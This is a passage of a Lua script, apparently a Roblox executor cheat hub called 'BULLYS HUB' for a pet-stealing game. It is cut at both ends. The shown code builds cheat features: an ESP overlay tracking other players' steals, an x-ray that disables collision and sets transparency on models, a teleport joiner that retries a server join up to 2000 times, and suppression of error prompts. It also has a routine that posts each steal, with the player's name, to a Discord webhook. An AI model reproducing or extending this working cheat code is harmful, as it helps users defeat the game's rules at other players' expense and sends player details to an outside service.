            addBtn.Position = UDim2.new(1, -45, 0.5, 0)

            addBtn.AnchorPoint = Vector2.new(0, 0.5)

            addBtn.BackgroundColor3 = Color3.fromRGB(14,14,20)

            addBtn.Text = "ADD"

            addBtn.Font = Enum.Font.GothamBold

            addBtn.TextSize = 10

            addBtn.TextColor3 = Color3.new(1, 1, 1)

            Instance.new("UICorner", addBtn).CornerRadius = UDim.new(0, 4)

            

            local isInPriority = false

            for _, pName in ipairs(PRIORITY_LIST) do

                if pName:lower() == petName:lower() then

                    isInPriority = true

                    break

                end

            end

            

            if isInPriority then

                addBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)

                addBtn.Text = "REM"

                addBtn.MouseButton1Click:Connect(function()

                    for i, pName in ipairs(PRIORITY_LIST) do

                        if pName:lower() == petName:lower() then

                            table.remove(PRIORITY_LIST, i)

                            savePriorityToConfig()

                            refreshPriorityList()

                            refreshAvailableList()

                            break

                        end

                    end

                end)

            else

                addBtn.MouseButton1Click:Connect(function()

                    table.insert(PRIORITY_LIST, petName)

                    savePriorityToConfig()

                    refreshPriorityList()

                    refreshAvailableList()

                end)

            end

            

            table.insert(availableButtons, itemFrame)

        end

        

        updateScrollSizes()

    end

    

    refreshAvailableList()

    refreshPriorityList()

    SharedState.RefreshPriorityGUI = function() task.defer(function() refreshAvailableList(); refreshPriorityList() end) end

    priorityGui:GetPropertyChangedSignal("Enabled"):Connect(function()

        if priorityGui.Enabled then SharedState.RefreshPriorityGUI() end

    end)

    

    local saveBtn = Instance.new("TextButton", mainFrame)

    saveBtn.Size = UDim2.new(0, 120, 0, 35)

    saveBtn.Position = UDim2.new(0.5, -60, 1, -45)

    saveBtn.BackgroundColor3 = Color3.fromRGB(14,14,20)

    saveBtn.Text = "SAVE PRIORITY"

    saveBtn.Font = Enum.Font.GothamBold

    saveBtn.TextSize = 12

    saveBtn.TextColor3 = Color3.new(1, 1, 1)

    Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 6)

    

    saveBtn.MouseButton1Click:Connect(function()

        savePriorityToConfig()

        ShowNotification("PRIORITY LIST", "Saved " .. #PRIORITY_LIST .. " pets!")

        local successLabel = Instance.new("TextLabel", mainFrame)

        successLabel.Size = UDim2.new(0, 200, 0, 30)

        successLabel.Position = UDim2.new(0.5, -100, 1, -80)

        successLabel.BackgroundColor3 = Color3.fromRGB(14,14,20)

        successLabel.Text = "Priority List Saved! (" .. #PRIORITY_LIST .. " pets)"

        successLabel.Font = Enum.Font.GothamBold

        successLabel.TextSize = 11

        successLabel.TextColor3 = Color3.new(1, 1, 1)

        successLabel.TextXAlignment = Enum.TextXAlignment.Center

        Instance.new("UICorner", successLabel).CornerRadius = UDim.new(0, 6)

        

        task.spawn(function()

            task.wait(2)

            if successLabel and successLabel.Parent then

                successLabel:Destroy()

            end

        end)

    end)

    

        UserInputService.InputBegan:Connect(function(input, processed)

            if processed then return end

            if input.KeyCode == Enum.KeyCode.P and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then

                priorityGui.Enabled = not priorityGui.Enabled

            end

        end)

end)

task.spawn(function()

    -- WEBHOOK_URL e DISCORD_ID definidos no topo do script

    local SUPER_PRIORITY = {

        "Strawberry Elephant",

        "Meowl",

        "Skibidi Toilet",

        "Headless Horseman",

        "Griffin",

        "Signore Carapace",

    }

    local function isOGPet(petName)

        if not petName then return false end

        local lower = petName:lower()

        for _, v in ipairs(SUPER_PRIORITY) do

            if v:lower() == lower then return true end

        end

        return false

    end

    local GITHUB_BASE = "https://raw.githubusercontent.com/buenowhh/bullys-hub-pets/main/pets/"

    local function getBrainrotImageId(petName)

        if not petName or petName == "" then return "" end

        local fileName = petName:lower():gsub("%s+", "_") .. ".png"

        return GITHUB_BASE .. fileName

    end

    local function SendWebhook(petName, value, mutation)

        local isOG = isOGPet(petName)

        local embedColor = isOG and 16711680 or 16711935

        local mutPrefix = (mutation and mutation ~= "None" and mutation ~= "") and ("[" .. mutation .. "] ") or ""

        local brainrotField = "`" .. mutPrefix .. petName .. " (" .. value .. ")`"

        local playerName = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")"
        local stealerField = "`" .. playerName .. "`"

        local thumbnailUrl = getBrainrotImageId(petName)

        local embedBody = {

            title = " Steal Detected",

            color = embedColor,

            fields = {

                {

                    name = "️ Brainrot",

                    value = brainrotField,

                    inline = false

                },

                {

                    name = "️ Stealer",

                    value = stealerField,

                    inline = false

                }

            },

            footer = { text = "BULLYS HUB" },

            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

        }

        if thumbnailUrl ~= "" then

            embedBody.thumbnail = { url = thumbnailUrl }

        end

        local body = { embeds = { embedBody } }

        if isOG then body.content = "🚨 OG PET STOLEN!" end

        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(body)
        })

    end

    local Packages = ReplicatedStorage:WaitForChild("Packages")

    local Datas = ReplicatedStorage:WaitForChild("Datas")

    local Shared = ReplicatedStorage:WaitForChild("Shared")

    local Utils = ReplicatedStorage:WaitForChild("Utils")

    

    local Synchronizer = require(Packages:WaitForChild("Synchronizer"))

    local AnimalsData = require(Datas:WaitForChild("Animals"))

    local AnimalsShared = require(Shared:WaitForChild("Animals"))

    local NumberUtils = require(Utils:WaitForChild("NumberUtils"))

    

    local isStealing = false

    local baseSnapshot = {}

    

    local stealStartTime = 0

    local stealStartPosition = Vector3.new(0, 0, 0)

    

    local function GetMyPlot()

        for _, plot in ipairs(Workspace.Plots:GetChildren()) do

            local channel = Synchronizer:Get(plot.Name)

            if channel then

                local owner = channel:Get("Owner")

                if (typeof(owner) == "Instance" and owner == LocalPlayer) or (typeof(owner) == "table" and owner.UserId == LocalPlayer.UserId) then

                    return plot

                end

            end

        end

        return nil

    end

    

    local function GetPetsOnPlot(plot)

        local pets = {}

        if not plot then return pets end

        

        local channel = Synchronizer:Get(plot.Name)

        local list = channel and channel:Get("AnimalList")

        if not list then return pets end

        

        for k, v in pairs(list) do

            if type(v) == "table" then

                pets[k] = {Index = v.Index, Mutation = v.Mutation, Traits = v.Traits}

            end

        end

        return pets

    end

    

    local function GetInfo(data)

        local info = AnimalsData[data.Index]

        local name = info and info.DisplayName or data.Index

        local genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)

        local valStr = "$" .. NumberUtils:ToString(genVal) .. "/s"

        return name, valStr, data.Mutation

    end

    -- ══════════════════════════════════════════════════════════════════
    -- INCOMING SLOT ESP — mostra na base de QUEM ESTA ROUBANDO
    -- ══════════════════════════════════════════════════════════════════
    local incomingBBs = {}

    local function getPlayerPlot(plr)
        for _, plot in ipairs(Workspace.Plots:GetChildren()) do
            local ok, ch = pcall(function() return Synchronizer:Get(plot.Name) end)
            if ok and ch then
                local ow = ch:Get("Owner")
                if (typeof(ow) == "Instance" and ow == plr) or (typeof(ow) == "table" and ow.UserId == plr.UserId) then
                    return plot
                end
            end
        end
        return nil
    end

    local function getNextEmptySlot(plot)
        if not plot then return nil, nil end
        local ok, channel = pcall(function() return Synchronizer:Get(plot.Name) end)
        if not ok or not channel then return nil, nil end
        local list = channel:Get("AnimalList")
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if not podiums then return nil, nil end
        local maxSlot = 0
        for _, p in ipairs(podiums:GetChildren()) do
            local n = tonumber(p.Name)
            if n and n > maxSlot then maxSlot = n end
        end
        local occupied = {}
        if list then
            for k, v in pairs(list) do
                if type(v) == "table" then occupied[tostring(k)] = true end
            end
        end
        for i = 1, maxSlot do
            if not occupied[tostring(i)] then
                local podium = podiums:FindFirstChild(tostring(i))
                if podium then return i, podium end
            end
        end
        return nil, nil
    end

    local function clearPlayerBB(plr)
        local uid = plr.UserId
        if incomingBBs[uid] then
            pcall(function() incomingBBs[uid]:Destroy() end)
            incomingBBs[uid] = nil
        end
    end

    local function showStealerSlot(plr)
        if Config.IncomingSlotESP == false then clearPlayerBB(plr); return end
        if plr == LocalPlayer then return end

        local stealing = plr:GetAttribute("Stealing")
        local stealIdx = plr:GetAttribute("StealingIndex")
        if not stealing or not stealIdx then clearPlayerBB(plr); return end

        local theirPlot = getPlayerPlot(plr)
        if not theirPlot then clearPlayerBB(plr); return end

        local slotNum, podium = getNextEmptySlot(theirPlot)
        if not slotNum or not podium then clearPlayerBB(plr); return end

        local base = podium:FindFirstChild("Base")
        local adornee = base and (base:FindFirstChild("Spawn") or base:FindFirstChildWhichIsA("BasePart") or base) or podium:FindFirstChildWhichIsA("BasePart") or podium
        if not adornee then clearPlayerBB(plr); return end

        local info = AnimalsData[stealIdx]
        local petName = info and info.DisplayName or stealIdx

        local existing = incomingBBs[plr.UserId]
        if existing and existing.Parent then
            local sl = existing:FindFirstChild("SlotLbl", true)
            local nl = existing:FindFirstChild("PetName", true)
            if sl then sl.Text = "Next Slot: #" .. tostring(slotNum) end
            if nl then nl.Text = petName end
            existing.Adornee = adornee
            if existing.Parent ~= adornee then existing.Parent = adornee end
            return
        end

        clearPlayerBB(plr)

        local bb = Instance.new("BillboardGui")
        bb.Name = "IncomingSlotBB"
        bb.Size = UDim2.new(0, 140, 0, 58)
        bb.StudsOffset = Vector3.new(0, 5, 0)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.MaxDistance = 400
        bb.Adornee = adornee
        bb.Parent = adornee

        local root = Instance.new("Frame", bb)
        root.Size = UDim2.new(1, 0, 0, 46)
        root.BackgroundColor3 = Color3.fromRGB(8, 10, 20)
        root.BackgroundTransparency = 0.08
        root.BorderSizePixel = 0
        Instance.new("UICorner", root).CornerRadius = UDim.new(0, 8)
        local stroke = Instance.new("UIStroke", root)
        stroke.Color = Color3.fromRGB(60, 120, 255)
        stroke.Thickness = 1.2
        stroke.Transparency = 0.2

        local tagLbl = Instance.new("TextLabel", root)
        tagLbl.Size = UDim2.new(1, -10, 0, 12)
        tagLbl.Position = UDim2.new(0, 6, 0, 4)
        tagLbl.BackgroundTransparency = 1
        tagLbl.Text = plr.DisplayName .. " stealing"
        tagLbl.Font = Enum.Font.GothamBold
        tagLbl.TextSize = 7
        tagLbl.TextColor3 = Color3.fromRGB(60, 120, 255)
        tagLbl.TextXAlignment = Enum.TextXAlignment.Left
        tagLbl.TextStrokeTransparency = 0.3
        tagLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        tagLbl.TextTruncate = Enum.TextTruncate.AtEnd

        local nameLbl = Instance.new("TextLabel", root)
        nameLbl.Name = "PetName"
        nameLbl.Size = UDim2.new(1, -10, 0, 16)
        nameLbl.Position = UDim2.new(0, 6, 0, 16)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = petName
        nameLbl.Font = Enum.Font.GothamBlack
        nameLbl.TextSize = 12
        nameLbl.TextColor3 = Color3.new(1, 1, 1)
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        nameLbl.TextStrokeTransparency = 0.1
        nameLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd

        local slotLbl = Instance.new("TextLabel", root)
        slotLbl.Name = "SlotLbl"
        slotLbl.Size = UDim2.new(1, -10, 0, 12)
        slotLbl.Position = UDim2.new(0, 6, 0, 32)
        slotLbl.BackgroundTransparency = 1
        slotLbl.Text = "Next Slot: #" .. tostring(slotNum)
        slotLbl.Font = Enum.Font.GothamBold
        slotLbl.TextSize = 8
        slotLbl.TextColor3 = Color3.fromRGB(255, 180, 40)
        slotLbl.TextXAlignment = Enum.TextXAlignment.Left
        slotLbl.TextStrokeTransparency = 0.3
        slotLbl.TextStrokeColor3 = Color3.new(0, 0, 0)

        local arrow = Instance.new("Frame", bb)
        arrow.Size = UDim2.new(0, 12, 0, 12)
        arrow.Position = UDim2.new(0.5, -6, 0, 46)
        arrow.Rotation = 45
        arrow.BackgroundColor3 = Color3.fromRGB(8, 10, 20)
        arrow.BackgroundTransparency = 0.08
        arrow.BorderSizePixel = 0
        local arrowStroke = Instance.new("UIStroke", arrow)
        arrowStroke.Color = Color3.fromRGB(60, 120, 255)
        arrowStroke.Thickness = 1.2
        arrowStroke.Transparency = 0.2

        incomingBBs[plr.UserId] = bb
    end

    local function hookPlayerStealing(plr)
        if plr == LocalPlayer then return end
        plr:GetAttributeChangedSignal("Stealing"):Connect(function()
            pcall(showStealerSlot, plr)
        end)
        plr:GetAttributeChangedSignal("StealingIndex"):Connect(function()
            if plr:GetAttribute("Stealing") then pcall(showStealerSlot, plr) end
        end)
        if plr:GetAttribute("Stealing") then pcall(showStealerSlot, plr) end
    end

    for _, plr in ipairs(Players:GetPlayers()) do pcall(hookPlayerStealing, plr) end
    Players.PlayerAdded:Connect(function(plr) pcall(hookPlayerStealing, plr) end)
    Players.PlayerRemoving:Connect(function(plr) clearPlayerBB(plr) end)

    task.spawn(function()
        while true do
            task.wait(0.4)
            if Config.IncomingSlotESP == false then continue end
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr:GetAttribute("Stealing") then
                    pcall(showStealerSlot, plr)
                end
            end
        end
    end)

    LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()

        local state = LocalPlayer:GetAttribute("Stealing")

        

        if state then

            isStealing = true

            baseSnapshot = GetPetsOnPlot(GetMyPlot())

            

            stealStartTime = tick()

            local char = LocalPlayer.Character

            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then

                stealStartPosition = hrp.Position

            end

        else

            if not isStealing then return end

            isStealing = false

            local stealDuration = tick() - stealStartTime

            local distanceMoved = 0

            local char = LocalPlayer.Character

            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then

                distanceMoved = (hrp.Position - stealStartPosition).Magnitude

            end

            

            task.wait(0.6)

            

            local currentPets = GetPetsOnPlot(GetMyPlot())

            local stolenData = nil

            

            for slot, data in pairs(currentPets) do

                local old = baseSnapshot[slot]

                if not old or (old.Index ~= data.Index or old.Mutation ~= data.Mutation) then

                    stolenData = data

                    break

                end

            end

            

            if stolenData then

    local name, gen, mut = GetInfo(stolenData)

    SendWebhook(name, gen, mut)

            end

        end

    end)

end)

SharedState.XrayData = {

    TARGET_TRANS = 0.7,

    INVISIBLE_TRANS = 1,

    ENFORCE_EVERY_FRAME = true,

    trackedObjects = {},

    trackedModels = {},

}

SharedState.XrayFunctions = {}

SharedState.XrayFunctions.nameHasClone = function(name)

	return string.find(string.lower(name), "clone", 1, true) ~= nil

end

SharedState.XrayFunctions.getTargetTransparency = function(obj)

	local xd = SharedState.XrayData

	if obj.Name == "HumanoidRootPart" then return xd.INVISIBLE_TRANS end

	return xd.TARGET_TRANS

end

SharedState.XrayFunctions.applyObject = function(obj)

	local target = SharedState.XrayFunctions.getTargetTransparency(obj)

	if obj:IsA("BasePart") then

		obj.CanCollide = false

		obj.Transparency = target

	elseif obj:IsA("Decal") or obj:IsA("Texture") then

		obj.Transparency = target

	end

end

SharedState.XrayFunctions.trackObject = function(obj)

	local xd = SharedState.XrayData

	local xf = SharedState.XrayFunctions

	if xd.trackedObjects[obj] then return end

	if not (obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture")) then return end

	xd.trackedObjects[obj] = true

	xf.applyObject(obj)

	if obj:IsA("BasePart") then

		obj:GetPropertyChangedSignal("CanCollide"):Connect(function()

			if obj.CanCollide ~= false then obj.CanCollide = false end

		end)

	end

	obj:GetPropertyChangedSignal("Transparency"):Connect(function()

		local correctTrans = xf.getTargetTransparency(obj)

		if obj.Transparency ~= correctTrans then obj.Transparency = correctTrans end

	end)

	obj.AncestryChanged:Connect(function()

		if obj.Parent == nil then xd.trackedObjects[obj] = nil end

	end)

end

SharedState.XrayFunctions.trackModel = function(model)

	local xd = SharedState.XrayData

	local xf = SharedState.XrayFunctions

	if xd.trackedModels[model] then return end

	xd.trackedModels[model] = true

	local descendants = model:GetDescendants()

	for i = 1, #descendants do xf.trackObject(descendants[i]) end

	model.DescendantAdded:Connect(function(d) xf.trackObject(d) end)

	model.AncestryChanged:Connect(function()

		if model.Parent == nil then xd.trackedModels[model] = nil end

	end)

end

SharedState.XrayFunctions.handleWorkspaceChild = function(child)

	if child.Parent ~= Workspace then return end

	if not child:IsA("Model") then return end

	if not SharedState.XrayFunctions.nameHasClone(child.Name) then return end

	SharedState.XrayFunctions.trackModel(child)

end

SharedState.XrayFunctions.hookRename = function(child)

	if child:IsA("Model") then

		child:GetPropertyChangedSignal("Name"):Connect(function()

			SharedState.XrayFunctions.handleWorkspaceChild(child)

		end)

	end

end

SharedState.XrayFunctions.initWorkspaceTracking = function()

	local workspaceChildren = Workspace:GetChildren()

	for i = 1, #workspaceChildren do

		SharedState.XrayFunctions.handleWorkspaceChild(workspaceChildren[i])

		SharedState.XrayFunctions.hookRename(workspaceChildren[i])

	end

end

SharedState.XrayFunctions.initWorkspaceTracking()

Workspace.ChildAdded:Connect(function(child)

	task.defer(function() SharedState.XrayFunctions.handleWorkspaceChild(child) end)

	SharedState.XrayFunctions.hookRename(child)

end)

if SharedState.XrayData.ENFORCE_EVERY_FRAME then

	SharedState.XrayFunctions.enforceXrayFrame = function()

		local xd = SharedState.XrayData

		local xf = SharedState.XrayFunctions

		local objList = {}

		for obj in pairs(xd.trackedObjects) do table.insert(objList, obj) end

		for i = 1, #objList do

			local obj = objList[i]

			if obj.Parent == nil then

				xd.trackedObjects[obj] = nil

			else

				if obj:IsA("BasePart") and obj.CanCollide ~= false then obj.CanCollide = false end

				local target = xf.getTargetTransparency(obj)

				if obj.Transparency ~= target then obj.Transparency = target end

			end

		end

	end

	do
		local _xrayLast = 0
		RunService.Heartbeat:Connect(function()
			local now = os.clock()
			if now - _xrayLast < 0.08 then return end
			_xrayLast = now
			SharedState.XrayFunctions.enforceXrayFrame()
		end)
	end

end

SharedState.FPSFunctions = {}

SharedState.FPSFunctions.removeMeshes = function(tool)

	if not tool:IsA("Tool") then return end

	local handle = tool:FindFirstChild("Handle")

	if not handle then return end

	local descendants = handle:GetDescendants()

	for i = 1, #descendants do

		local descendant = descendants[i]

		if descendant:IsA("SpecialMesh") or descendant:IsA("Mesh") or descendant:IsA("FileMesh") then

			descendant:Destroy()

		end

	end

end

SharedState.FPSFunctions.onCharacterAdded = function(character)

	local ff = SharedState.FPSFunctions

	character.ChildAdded:Connect(function(child)

		if child:IsA("Tool") and Config.FPSBoost then ff.removeMeshes(child) end

	end)

	local children = character:GetChildren()

	for i = 1, #children do

		if children[i]:IsA("Tool") then ff.removeMeshes(children[i]) end

	end

end

SharedState.FPSFunctions.onPlayerAdded = function(player)

	local ff = SharedState.FPSFunctions

	player.CharacterAdded:Connect(ff.onCharacterAdded)

	if player.Character then ff.onCharacterAdded(player.Character) end

end

SharedState.FPSFunctions.initPlayerTracking = function()

	local ff = SharedState.FPSFunctions

	local allPlayers = Players:GetPlayers()

	for i = 1, #allPlayers do ff.onPlayerAdded(allPlayers[i]) end

	Players.PlayerAdded:Connect(ff.onPlayerAdded)

end

SharedState.FPSFunctions.initPlayerTracking()

if Config.CleanErrorGUIs then

    task.spawn(function()

        local GuiService = cloneref and cloneref(game:GetService("GuiService")) or game:GetService("GuiService")

        while true do

            if Config.CleanErrorGUIs then

                pcall(function() GuiService:ClearError() end)

            end

            task.wait(0.005)

        end

    end)

end

task.spawn(function()

    local HTheme = {

        Background = Color3.fromRGB(10,10,10),

        Accent1 = Color3.fromRGB(170,170,170),

        Accent2 = Color3.fromRGB(125,125,125),

        White   = Color3.fromRGB(240,240,240),

        Gray    = Color3.fromRGB(125,125,125),

        Success = Color3.fromRGB(170,170,170),

        Error   = Color3.fromRGB(210, 90, 90)

    }

    local SCALE = 1

    local HEIGHT = 50 * SCALE

    

    local joinerGui = Instance.new("ScreenGui")

    joinerGui.Name = "BullysJobJoiner"

    joinerGui.ResetOnSpawn = false

    joinerGui.Enabled = Config.ShowJobJoiner

    joinerGui.Parent = PlayerGui

    local main = Instance.new("Frame")

    main.Name = "Main"

    main.Size = UDim2.new(0, 500 * SCALE, 0, HEIGHT)

    

    local savedPos = Config.Positions.JobJoiner or {X = 0.5, Y = 0.85}

    

    main.AnchorPoint = Vector2.new(0.5, 0) 

    main.Position = UDim2.new(savedPos.X, 0, savedPos.Y, 0)

    

    main.BackgroundColor3 = Color3.fromRGB(14, 14, 18)

    main.BackgroundTransparency = 0.05

    main.BorderSizePixel = 0

    main.Parent = joinerGui

    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = Color3.fromRGB(50, 80, 140)
    mainStroke.Thickness = 1
    mainStroke.Transparency = 0.5

    local bgGradient = Instance.new("UIGradient", main)

    bgGradient.Color = ColorSequence.new{

        ColorSequenceKeypoint.new(0, Color3.fromRGB(14,14,18)),

        ColorSequenceKeypoint.new(1, Color3.fromRGB(18,18,22))

    }

    bgGradient.Rotation = 45

    MakeDraggable(main, main, "JobJoiner")

    local content = Instance.new("Frame", main)

    content.Size = UDim2.new(1, -20*SCALE, 1, 0)

    content.Position = UDim2.new(0, 10*SCALE, 0, 0)

    content.BackgroundTransparency = 1

    

    local layout = Instance.new("UIListLayout", content)

    layout.FillDirection = Enum.FillDirection.Horizontal

    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    layout.VerticalAlignment = Enum.VerticalAlignment.Center

    layout.Padding = UDim.new(0, 8 * SCALE)

    local function CreateInput(placeholder, width, default)

        local frame = Instance.new("Frame")

        frame.BackgroundTransparency = 1

        frame.Size = UDim2.new(0, width * SCALE, 0, 32 * SCALE)

        

        local label = Instance.new("TextLabel", frame)

        label.Size = UDim2.new(1, 0, 0, 10 * SCALE)

        label.Position = UDim2.new(0, 0, 0, -10 * SCALE)

        label.BackgroundTransparency = 1

        label.Text = placeholder

        label.TextColor3 = Color3.fromRGB(120, 122, 140)

        label.Font = Enum.Font.GothamBold

        label.TextSize = 9 * SCALE

        

        local box = Instance.new("TextBox", frame)

        box.Size = UDim2.new(1, 0, 1, 0)

        box.BackgroundColor3 = Color3.fromRGB(10, 10, 12)

        box.BackgroundTransparency = 0.5

        box.Text = default or ""

        box.PlaceholderText = placeholder

        box.TextColor3 = Color3.new(1,1,1)

        box.Font = Enum.Font.GothamBold

        box.TextSize = 12 * SCALE

        box.ClearTextOnFocus = false

        

        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)

        

        box.Focused:Connect(function() 

            -- tween removed 

        end)

        box.FocusLost:Connect(function() 

            -- tween removed 

        end)

        

        return frame, box

    end

    local function CreateButton(text, width, color)

        local btn = Instance.new("TextButton")

        btn.Size = UDim2.new(0, width * SCALE, 0, 32 * SCALE)

        btn.BackgroundColor3 = color

        btn.BackgroundTransparency = 0.2

        btn.Text = text

        btn.Font = Enum.Font.GothamBlack

        btn.TextSize = 12 * SCALE

        btn.TextColor3 = Color3.new(1,1,1)

        btn.AutoButtonColor = false

        

        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        

        btn.MouseEnter:Connect(function()

            -- tween removed

            -- tween removed

        end)

        btn.MouseLeave:Connect(function()

            -- tween removed

            -- tween removed

        end)

        

        return btn

    end

    -- ── Joiner Elements ──────────────────────────────────

    local idFrame, idBox = CreateInput("", 165, "")
    idBox.PlaceholderText = "JobId"
    idBox.PlaceholderColor3 = Color3.fromRGB(50, 55, 75)
    idBox.TextSize = 11 * SCALE
    idBox.Font = Enum.Font.GothamBlack
    idBox.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
    idBox.TextColor3 = Color3.fromRGB(230, 235, 255)
    idFrame.Parent = content
    idBox.TextTruncate = Enum.TextTruncate.AtEnd

    local attFrame, attBox = CreateInput("", 45, "2000")
    attBox.PlaceholderText = "Att"
    attBox.PlaceholderColor3 = Color3.fromRGB(50, 55, 75)
    attBox.TextSize = 10 * SCALE
    attBox.Font = Enum.Font.GothamBlack
    attBox.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
    attBox.TextColor3 = Color3.fromRGB(200, 205, 225)
    attFrame.Parent = content

    local delFrame, delBox = CreateInput("", 40, "0.01")
    delBox.PlaceholderText = "Del"
    delBox.PlaceholderColor3 = Color3.fromRGB(50, 55, 75)
    delBox.TextSize = 10 * SCALE
    delBox.Font = Enum.Font.GothamBlack
    delBox.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
    delBox.TextColor3 = Color3.fromRGB(200, 205, 225)
    delFrame.Parent = content

    local pasteBtn = CreateButton("PASTE", 50, Color3.fromRGB(80, 140, 255))
    pasteBtn.Parent = content
    pasteBtn.BackgroundTransparency = 0
    pasteBtn.TextColor3 = Color3.fromRGB(10, 10, 18)
    pasteBtn.TextSize = 10 * SCALE

    local joinBtn = CreateButton("JOIN", 45, Color3.fromRGB(30, 32, 42))
    joinBtn.Parent = content
    joinBtn.BackgroundTransparency = 0
    joinBtn.TextColor3 = Color3.fromRGB(80, 140, 255)
    joinBtn.TextSize = 11 * SCALE

    local clearBtn = CreateButton("CLEAR", 45, Color3.fromRGB(24, 26, 34))
    clearBtn.Parent = content
    clearBtn.TextColor3 = Color3.fromRGB(90, 92, 110)
    clearBtn.TextSize = 9 * SCALE

    local isJoining = false

    local function startJoin()
        local jobId = idBox.Text:gsub("%s+", "")
        local attempts = tonumber(attBox.Text) or 2000
        local delayTime = tonumber(delBox.Text) or 0.01

        if jobId == "" or #jobId < 5 then
            ShowNotification("JOINER", "Invalid JobId")
            return
        end

        isJoining = true
        joinBtn.Text = "STOP"
        joinBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        joinBtn.TextColor3 = Color3.new(1, 1, 1)

        task.spawn(function()
            for i = 1, attempts do
                if not isJoining then break end
                ShowNotification("JOINING", "Attempt " .. i .. "/" .. attempts)
                pcall(function()
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
                end)
                task.wait(delayTime)
            end

            isJoining = false
            if joinBtn and joinBtn.Parent then
                joinBtn.Text = "JOIN"
                joinBtn.BackgroundColor3 = Color3.fromRGB(30, 32, 42)
                joinBtn.TextColor3 = Color3.fromRGB(80, 140, 255)
            end
        end)
    end

    joinBtn.MouseButton1Click:Connect(function()
        if isJoining then
            isJoining = false
            joinBtn.Text = "JOIN"
            joinBtn.BackgroundColor3 = Color3.fromRGB(30, 32, 42)
            joinBtn.TextColor3 = Color3.fromRGB(80, 140, 255)
            ShowNotification("JOINER", "Cancelled")
            return
        end
        startJoin()
    end)

    -- PASTE: simula Ctrl+V via keypress → auto join no Enter
    pasteBtn.MouseButton1Click:Connect(function()
        if isJoining then return end
        idBox.Text = ""
        idBox:CaptureFocus()
        task.wait(0.1)
        pcall(function()
            keypress(0x11) -- VK_CONTROL
            keypress(0x56) -- VK_V
            task.wait(0.05)
            keyrelease(0x56)
            keyrelease(0x11)
        end)
        task.wait(0.2)
        local txt = idBox.Text:gsub("%s+", "")
        if txt ~= "" and #txt >= 5 then
            task.delay(0.1, startJoin)
        end
    end)

    idBox.FocusLost:Connect(function(enterPressed)
        if enterPressed and not isJoining then
            local txt = idBox.Text:gsub("%s+", "")
            if txt ~= "" and #txt >= 5 then
                startJoin()
            end
        end
    end)

    clearBtn.MouseButton1Click:Connect(function()
        if isJoining then
            isJoining = false
            joinBtn.Text = "JOIN"
            joinBtn.BackgroundColor3 = Color3.fromRGB(30, 32, 42)
            joinBtn.TextColor3 = Color3.fromRGB(80, 140, 255)
        end
        idBox.Text = ""
        ShowNotification("JOINER", "Cleared")
    end)

end)

task.spawn(function()

    local tGui = Instance.new("ScreenGui")

    tGui.Name = "BullysThemeUI"

    tGui.ResetOnSpawn = false

    tGui.DisplayOrder = 50

    tGui.Parent = PlayerGui

    -- Painel principal

    local tPanel = Instance.new("Frame", tGui)

    tPanel.Name = "ThemePanel"

    tPanel.Size = UDim2.new(0, 220, 0, 440)

    tPanel.Position = UDim2.new(0.5, -110, 0, 80)

    tPanel.BackgroundColor3 = Color3.fromRGB(20, 15, 20)

    tPanel.BackgroundTransparency = 0.12

    tPanel.BorderSizePixel = 0

    tPanel.Visible = false

    Instance.new("UICorner", tPanel).CornerRadius = UDim.new(0, 8)

    -- Header / drag

    local tHeader = Instance.new("Frame", tPanel)

    tHeader.Size = UDim2.new(1, 0, 0, 36)

    tHeader.BackgroundTransparency = 1

    local tTitle = Instance.new("TextLabel", tHeader)

    tTitle.Size = UDim2.new(1, -40, 1, 0)

    tTitle.Position = UDim2.new(0, 14, 0, 0)

    tTitle.BackgroundTransparency = 1

    tTitle.Text = " TEMAS"

    tTitle.Font = Enum.Font.GothamBlack

    tTitle.TextSize = 14

    tTitle.TextColor3 = Color3.fromRGB(240, 240, 240)

    tTitle.TextXAlignment = Enum.TextXAlignment.Left

    local tClose = Instance.new("TextButton", tHeader)

    tClose.Size = UDim2.new(0, 24, 0, 24)

    tClose.Position = UDim2.new(1, -30, 0.5, -12)

    tClose.BackgroundColor3 = Color3.fromRGB(90, 90, 90)

    tClose.Text = ""

    tClose.Font = Enum.Font.GothamBold

    tClose.TextSize = 12

    tClose.TextColor3 = Color3.new(1, 1, 1)

    tClose.AutoButtonColor = false

    Instance.new("UICorner", tClose).CornerRadius = UDim.new(1, 0)

    tClose.MouseButton1Click:Connect(function()

        tPanel.Visible = false

    end)

    -- Drag

    MakeDraggable(tHeader, tPanel)

    -- Divisor

    local tDiv = Instance.new("Frame", tPanel)

    tDiv.Size = UDim2.new(1, -20, 0, 1)

    tDiv.Position = UDim2.new(0, 10, 0, 36)

    tDiv.BackgroundColor3 = Color3.fromRGB(170, 170, 170)

    tDiv.BackgroundTransparency = 0.6

    tDiv.BorderSizePixel = 0

    -- Container dos botões

    local tContent = Instance.new("Frame", tPanel)

